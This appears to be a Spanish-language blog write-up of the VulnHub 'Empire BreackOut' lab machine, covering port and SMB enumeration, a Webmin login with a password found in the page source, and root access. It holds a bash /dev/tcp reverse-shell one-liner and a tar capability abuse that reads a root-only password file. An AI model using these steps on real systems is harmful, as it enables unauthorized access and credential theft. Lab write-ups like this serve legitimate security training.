<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            VulnHub Empire BreackOut - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Empire BreackOut en la plataforma de VulnHub">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="VulnHub Empire BreackOut">
<meta property="og:url" content="http://localhost:4000/vh-empirebreackout/">


  <meta property="og:description" content="Resolución de la máquina Empire BreackOut en la plataforma de VulnHub">



  <meta property="og:image" content="http://localhost:4000/assets/images/vh-empirebreackout/empirebreackout.jpg">





  <meta property="article:published_time" content="2022-04-02T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/vh-empirebreackout/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">VulnHub Empire BreackOut</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="VulnHub Empire BreackOut">
    <meta itemprop="description" content="Resolución de la máquina Empire BreackOut en la plataforma de VulnHub">
    <meta itemprop="datePublished" content="April 02, 2022">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">VulnHub Empire BreackOut
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-04-02T00:00:00-06:00">April 02, 2022 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/vh-empirebreackout/banner-empirebreackout.jpg" alt="" /></p>

<h2 id="empire-breackout">Empire BreackOut</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.0.0.28 (la cual obtenemos al ejecutar el comando <code class="language-plaintext highlighter-rouge">netdiscover</code>).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ netdiscover
 Currently scanning: 192.168.14.0/16   |   Screen View: Unique Hosts                                                             
                                                                                                                                
 8 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 480
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 <span class="nt">-----------------------------------------------------------------------------</span>
 10.0.0.28       00:0c:29:3d:7a:ce      1      60  VMware, Inc.
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.0.0.28
PING 10.0.0.28 <span class="o">(</span>10.0.0.28<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.0.0.28: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>64 <span class="nb">time</span><span class="o">=</span>0.572 ms

<span class="nt">---</span> 10.0.0.28 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 0.572/0.572/0.572/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.0.0.28 <span class="nt">-oG</span> allPorts
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-02 00:28 CST
Initiating ARP Ping Scan at 00:28
Scanning 10.0.0.28 <span class="o">[</span>1 port]
Completed ARP Ping Scan at 00:28, 0.07s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 00:28
Scanning 10.0.0.28 <span class="o">[</span>65535 ports]
Discovered open port 139/tcp on 10.0.0.28
Discovered open port 80/tcp on 10.0.0.28
Discovered open port 445/tcp on 10.0.0.28
Discovered open port 20000/tcp on 10.0.0.28
Discovered open port 10000/tcp on 10.0.0.28
Completed SYN Stealth Scan at 00:28, 6.28s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.0.0.28
Host is up <span class="o">(</span>0.00090s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65530 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
10000/tcp open  snet-sensor-mgmt
20000/tcp open  dnp
MAC Address: 00:0C:29:3D:7A:CE <span class="o">(</span>VMware<span class="o">)</span>

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>6.55 seconds
           Raw packets sent: 65536 <span class="o">(</span>2.884MB<span class="o">)</span> | Rcvd: 65536 <span class="o">(</span>2.621MB<span class="o">)</span>
</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┼──────────────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 131 B
───────┼──────────────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.0.0.28
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80,139,445,10000,20000
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,139,445,10000,20000 10.0.0.28 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-04-02 00:29 CST
Nmap scan report <span class="k">for </span>10.0.0.28
Host is up <span class="o">(</span>0.00029s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 <span class="o">((</span>Debian<span class="o">))</span>
|_http-server-header: Apache/2.4.51 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 <span class="o">(</span>Webmin httpd<span class="o">)</span>
|_http-server-header: MiniServ/1.981
|_http-title: 200 &amp;mdash<span class="p">;</span> Document follows
20000/tcp open  http        MiniServ 1.830 <span class="o">(</span>Webmin httpd<span class="o">)</span>
|_http-server-header: MiniServ/1.830
|_http-title: 200 &amp;mdash<span class="p">;</span> Document follows
MAC Address: 00:0C:29:3D:7A:CE <span class="o">(</span>VMware<span class="o">)</span>

Host script results:
|_clock-skew: <span class="nt">-1s</span>
| smb2-time: 
|   <span class="nb">date</span>: 2022-04-02T06:29:11
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>41.75 seconds
</code></pre></div></div>

<p>Vemos el puerto 445 abierto, por lo tanto vamos a ver si podemos conectarnos con una <strong><em>Null Session</em></strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.0.0.28 <span class="nt">-N</span>

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>Samba 4.13.5-Debian<span class="o">)</span>
SMB1 disabled <span class="nt">--</span> no workgroup available
❯ smbmap <span class="nt">-H</span> 10.0.0.28 <span class="nt">-u</span> <span class="s1">''</span>
<span class="o">[</span>+] IP: 10.0.0.28:445   Name: 10.0.0.28                                         
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        print<span class="nv">$ </span>                                                 NO ACCESS       Printer Drivers
        IPC<span class="nv">$ </span>                                                   NO ACCESS       IPC Service <span class="o">(</span>Samba 4.13.5-Debian<span class="o">)</span>
</code></pre></div></div>

<p>No tenemos permisos en los directorios que se muestran. Por lo tanto, vamos ahora con los servicios HTTP y como siempre primero vamos a lanzar un <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.0.0.28/
http://10.0.0.28/ <span class="o">[</span>200 OK] Apache[2.4.51], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.51 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.0.0.28], Title[Apache2 Debian Default Page: It works]
❯ whatweb http://10.0.0.28:10000
http://10.0.0.28:10000 <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTTPServer[MiniServ/1.981], IP[10.0.0.28], Title[200 &amp;mdash<span class="p">;</span> Document follows]
❯ whatweb http://10.0.0.28:20000
http://10.0.0.28:20000 <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTTPServer[MiniServ/1.830], IP[10.0.0.28], Title[200 &amp;mdash<span class="p">;</span> Document follows]
</code></pre></div></div>

<p>No vemos nada interesante, así que vamos a ver el contenido vía web.</p>

<p><img src="/assets/images/vh-empirebreackout/empire-web.png" alt="" /></p>

<p><img src="/assets/images/vh-empirebreackout/empire-web1.png" alt="" /></p>

<p><img src="/assets/images/vh-empirebreackout/empire-web2.png" alt="" /></p>

<p>No vemos nada interesante, así que checaremos el código fuente de las páginas.</p>

<p><img src="/assets/images/vh-empirebreackout/empire-web3.png" alt="" /></p>

<p>Por el puerto 80 vemos hasta el final del código fuente un comentario en donde se nos comparte una contraseña, la cual se encuentra cifrada en <a href="https://es.wikipedia.org/wiki/Brainfuck">Brainfuck</a>. Por lo tanto, podemos utilizar el recurso online <a href="https://www.dcode.fr/brainfuck-language">dcode</a>.</p>

<p><img src="/assets/images/vh-empirebreackout/empire-web4.png" alt="" /></p>

<p>Tenemos una contraseña pero desconocemos para que usuario; por lo tanto vamos a tratar de descubrir usuarios a través del servicio SMB mediante el uso de la herramienta <code class="language-plaintext highlighter-rouge">enum4linux</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ enum4linux 10.0.0.28                                          
Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Sat Apr  2 00:46:56 2022
                                                                
 <span class="o">==========================</span>                                     
|    Target Information    |                                    
 <span class="o">==========================</span>                                     
Target ........... 10.0.0.28                                    
RID Range ........ 500-550,1000-1050                                                                                             
Username ......... <span class="s1">''</span>                                                                                                            
Password ......... <span class="s1">''</span>                                                                                                            
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
                                                                                                                                 
                                                                                                                                 
 <span class="o">=================================================</span>                                                                               
|    Enumerating Workgroup/Domain on 10.0.0.28    |
 <span class="o">=================================================</span> 
<span class="o">[</span>+] Got domain/workgroup name: WORKGROUP                        
                                                                
 <span class="o">=========================================</span> 
|    Nbtstat Information <span class="k">for </span>10.0.0.28    |
 <span class="o">=========================================</span>                                                                                       
Looking up status of 10.0.0.28                                  
        BREAKOUT        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
        BREAKOUT        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service                                                             
        BREAKOUT        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service                                                           
        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser                                                                
        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser   
        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
                                                                                                                                 
        MAC Address <span class="o">=</span> 00-00-00-00-00-00                         
                                                                
 <span class="o">==================================</span>                                                                                              
|    Session Check on 10.0.0.28    |                                                                                             
 <span class="o">==================================</span>                                                                                              
<span class="o">[</span>+] Server 10.0.0.28 allows sessions using username <span class="s1">''</span>, password <span class="s1">''</span>                                                              
                                                                                                                                 
 <span class="o">========================================</span>                                                                                        
|    Getting domain SID <span class="k">for </span>10.0.0.28    |                                                                                       
 <span class="o">========================================</span>                                                                                        
Domain Name: WORKGROUP                                                                                                           
Domain Sid: <span class="o">(</span>NULL SID<span class="o">)</span>                                                                                                           
<span class="o">[</span>+] Can<span class="s1">'t determine if host is part of domain or part of a workgroup
 ===================================                                                                                             
|    OS information on 10.0.0.28    |                                                                                            
 ===================================                                                                                             
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.                                  
[+] Got OS info for 10.0.0.28 from smbclient:                                                                                    
[+] Got OS info for 10.0.0.28 from srvinfo:                                                                                      
        BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ========================== 
|    Users on 10.0.0.28    |
 ========================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ====================================== 
|    Share Enumeration on 10.0.0.28    |
 ====================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.13.5-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.0.0.28
//10.0.0.28/print$      Mapping: DENIED, Listing: N/A
//10.0.0.28/IPC$        [E] Can'</span>t understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span class="se">\*</span>

 <span class="o">=================================================</span> 
|    Password Policy Information <span class="k">for </span>10.0.0.28    |
 <span class="o">=================================================</span> 


<span class="o">[</span>+] Attaching to 10.0.0.28 using a NULL share

<span class="o">[</span>+] Trying protocol 139/SMB...

<span class="o">[</span>+] Found domain<span class="o">(</span>s<span class="o">)</span>:

        <span class="o">[</span>+] BREAKOUT
        <span class="o">[</span>+] Builtin

<span class="o">[</span>+] Password Info <span class="k">for </span>Domain: BREAKOUT

        <span class="o">[</span>+] Minimum password length: 5
        <span class="o">[</span>+] Password <span class="nb">history </span>length: None
        <span class="o">[</span>+] Maximum password age: 37 days 6 hours 21 minutes 
        <span class="o">[</span>+] Password Complexity Flags: 000000

                <span class="o">[</span>+] Domain Refuse Password Change: 0
                <span class="o">[</span>+] Domain Password Store Cleartext: 0
                <span class="o">[</span>+] Domain Password Lockout Admins: 0
                <span class="o">[</span>+] Domain Password No Clear Change: 0
                <span class="o">[</span>+] Domain Password No Anon Change: 0
                <span class="o">[</span>+] Domain Password Complex: 0

        <span class="o">[</span>+] Minimum password age: None
        <span class="o">[</span>+] Reset Account Lockout Counter: 30 minutes 
        <span class="o">[</span>+] Locked Account Duration: 30 minutes 
        <span class="o">[</span>+] Account Lockout Threshold: None
        <span class="o">[</span>+] Forced Log off Time: 37 days 6 hours 21 minutes 


<span class="o">[</span>+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 <span class="o">===========================</span> 
|    Groups on 10.0.0.28    |
 <span class="o">===========================</span> 

<span class="o">[</span>+] Getting <span class="nb">builtin groups</span>:

<span class="o">[</span>+] Getting <span class="nb">builtin </span>group memberships:

<span class="o">[</span>+] Getting <span class="nb">local groups</span>:

<span class="o">[</span>+] Getting <span class="nb">local </span>group memberships:

<span class="o">[</span>+] Getting domain <span class="nb">groups</span>:

<span class="o">[</span>+] Getting domain group memberships:

 <span class="o">====================================================================</span> 
|    Users on 10.0.0.28 via RID cycling <span class="o">(</span>RIDS: 500-550,1000-1050<span class="o">)</span>    |
 <span class="o">====================================================================</span> 
<span class="o">[</span>I] Found new SID: S-1-22-1
<span class="o">[</span>I] Found new SID: S-1-5-21-1683874020-4104641535-3793993001
<span class="o">[</span>I] Found new SID: S-1-5-32
<span class="o">[</span>+] Enumerating <span class="nb">users </span>using SID S-1-22-1 and logon username <span class="s1">''</span>, password <span class="s1">''</span>
S-1-22-1-1000 Unix User<span class="se">\c</span>yber <span class="o">(</span>Local User<span class="o">)</span>
</code></pre></div></div>

<p>Encontramos el usuario <strong>cyber</strong> y tenemos paneles de login por los puertos 10000 y 20000 del <strong><em>Webmin</em></strong>.</p>

<p><img src="/assets/images/vh-empirebreackout/empire-web5.png" alt="" /></p>

<p><img src="/assets/images/vh-empirebreackout/empire-web6.png" alt="" /></p>

<p>Vamos a tratar de loguearnos con las credenciales que contamos <strong>cyber : .2uqPEfj3D&lt;P’a-3</strong> en ambos paneles a ver en cual podemos acceder y vemos que podemos acceder al servicio está corriendo por el puerto 20000.</p>

<p><img src="/assets/images/vh-empirebreackout/empire-web7.png" alt="" /></p>

<p>Si investigamos un poco dentro del panel, vemos que existe un item que nos permte ejecutar comandos a nivel de sistema.</p>

<p><img src="/assets/images/vh-empirebreackout/empire-web8.png" alt="" /></p>

<p><img src="/assets/images/vh-empirebreackout/empire-web9.png" alt="" /></p>

<p>Ahora, vamos a tratar de entablarnos una reverse shell a una máquina de atacante. Por lo tanto, nos ponemos en escucha por el puerto 443:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>cyber@breakout ~] bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.0.0.25/443 0&gt;&amp;1
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.0.0.25] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.0.28] 56686
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>999<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
cyber@breakout:~<span class="nv">$ </span><span class="nb">whoami
whoami
</span>cyber
cyber@breakout:~<span class="err">$</span>
</code></pre></div></div>

<p>Como siempre, vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Ya dentro de la máquina somos el usuario <strong>cyber</strong> y podemos visualizar la flag (user.txt). Si checamos nuestro directorio personal, vemos el binario <code class="language-plaintext highlighter-rouge">tar</code>, el cual podría tratarse de una pista.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 524
<span class="nt">-rwxr-xr-x</span> 1 root  root  531928 Oct 19 15:40 <span class="nb">tar</span>
<span class="nt">-rw-r--r--</span> 1 cyber cyber     48 Oct 19 14:31 user.txt
cyber@breakout:~<span class="err">$</span>
</code></pre></div></div>

<p>Si checamos las capabilities del binario, vemos que tiene <code class="language-plaintext highlighter-rouge">cap_dac_read_search=ep</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span>getcap <span class="nb">tar
tar </span><span class="nv">cap_dac_read_search</span><span class="o">=</span>ep
cyber@breakout:~<span class="err">$</span>
</code></pre></div></div>

<p>Esto nos permite tener permisos de lectura a cualquier archivo; lo que nos permitiría crear un archivo comprimido de cualquier archivo del sistema para posteriormente descomprimir y tener los permisos del usuario <strong>cyber</strong>. Por lo tanto, podriamos tratar de pensar que existe un archivo que tenga información que nos ayude a convertirnos en <strong>root</strong>. Si buscamos un poco, encontramos un recurso interesante en <code class="language-plaintext highlighter-rouge">/var/backups</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:/<span class="nv">$ </span>find <span class="nt">-name</span> <span class="s2">".*"</span> <span class="nt">-print</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nt">-E</span> <span class="s2">"sys|etc|run"</span>
<span class="nb">.</span>
./home/cyber/.tmp
./home/cyber/.tmp/.theme_Nzg2ZTc0MjFmZGY4_usermin_tree_cyber
./home/cyber/.tmp/.theme_ZmNhNzIwNWY1MWQw_usermin_tree_cyber
./home/cyber/.spamassassin
./home/cyber/.gnupg
./home/cyber/.bash_history
./home/cyber/.filemin
./home/cyber/.profile
./home/cyber/.bashrc
./home/cyber/.usermin
./home/cyber/.bash_logout
./home/cyber/.local
./usr/share/dictionaries-common/site-elisp/.nosearch
./usr/share/webmin/smf/images/.del-left.gif-Dec-05-04
./var/backups/.old_pass.bak
./tmp/.webmin
./tmp/.ICE-unix
./tmp/.XIM-unix
./tmp/.Test-unix
./tmp/.font-unix
./tmp/.X11-unix
cyber@breakout:/<span class="err">$</span>
cyber@breakout:/<span class="nv">$ </span><span class="nb">cd</span> /var/backups/
cyber@breakout:/var/backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 28
drwxr-xr-x  2 root root  4096 Apr  1 23:51 <span class="nb">.</span>
drwxr-xr-x 14 root root  4096 Oct 19 13:48 ..
<span class="nt">-rw-r--r--</span>  1 root root 12732 Oct 19 15:56 apt.extended_states.0
<span class="nt">-rw-------</span>  1 root root    17 Oct 20 07:49 .old_pass.bak
cyber@breakout:/var/backups<span class="err">$</span>
</code></pre></div></div>

<p>El recurso <code class="language-plaintext highlighter-rouge">.old_pass.bak</code> tiene permisos sólo de <strong>root</strong>, pero podemos comprimirlo con el binario <code class="language-plaintext highlighter-rouge">tar</code> en nuestro directorio personal y luego descomprimirlo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:/var/backups<span class="nv">$ </span>/home/cyber/tar <span class="nt">-cf</span> /home/cyber/backup.tar .old_pass.bak 
cyber@breakout:/var/backups<span class="nv">$ </span><span class="nb">cd</span> /home/cyber/
cyber@breakout:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 536
<span class="nt">-rw-r--r--</span> 1 cyber cyber  10240 Apr  2 03:15 backup.tar
<span class="nt">-rwxr-xr-x</span> 1 root  root  531928 Oct 19 15:40 <span class="nb">tar</span>
<span class="nt">-rw-r--r--</span> 1 cyber cyber     48 Oct 19 14:31 user.txt
cyber@breakout:~<span class="err">$</span>
</code></pre></div></div>

<p>Descomprimirmos el archivo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span>./tar <span class="nt">-xf</span> backup.tar 
cyber@breakout:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 584
drwxr-xr-x  8 cyber cyber   4096 Apr  2 03:16 <span class="nb">.</span>
drwxr-xr-x  3 root  root    4096 Oct 19 08:24 ..
<span class="nt">-rw-r--r--</span>  1 cyber cyber  10240 Apr  2 03:15 backup.tar
<span class="nt">-rw-------</span>  1 cyber cyber      0 Oct 20 07:52 .bash_history
<span class="nt">-rw-r--r--</span>  1 cyber cyber    220 Oct 19 08:24 .bash_logout
<span class="nt">-rw-r--r--</span>  1 cyber cyber   3526 Oct 19 08:24 .bashrc
drwxr-xr-x  2 cyber cyber   4096 Oct 19 14:06 .filemin
drwx------  2 cyber cyber   4096 Oct 19 14:00 .gnupg
drwxr-xr-x  3 cyber cyber   4096 Oct 19 14:29 .local
<span class="nt">-rw-------</span>  1 cyber cyber     17 Oct 20 07:49 .old_pass.bak
<span class="nt">-rw-r--r--</span>  1 cyber cyber    807 Oct 19 08:24 .profile
drwx------  2 cyber cyber   4096 Oct 19 13:59 .spamassassin
<span class="nt">-rwxr-xr-x</span>  1 root  root  531928 Oct 19 15:40 <span class="nb">tar
</span>drwxr-xr-x  2 cyber cyber   4096 Oct 20 07:52 .tmp
drwx------ 16 cyber cyber   4096 Oct 19 14:26 .usermin
<span class="nt">-rw-r--r--</span>  1 cyber cyber     48 Oct 19 14:31 user.txt
cyber@breakout:~<span class="err">$</span>
</code></pre></div></div>

<p>Ahora si tenemos permisos de lectura y escritura del archivo <code class="language-plaintext highlighter-rouge">.old_pass.bak</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span><span class="nb">cat</span> .old_pass.bak
Ts&amp;4&amp;YurgtRX<span class="o">(=</span>~h
cyber@breakout:~<span class="err">$</span>
</code></pre></div></div>

<p>Tenemos una contraseña la cual podría tratarse del usuario <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cyber@breakout:~<span class="nv">$ </span>su root
Password: 
root@breakout:/home/cyber# <span class="nb">whoami
</span>root
root@breakout:/home/cyber#
</code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (r00t.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
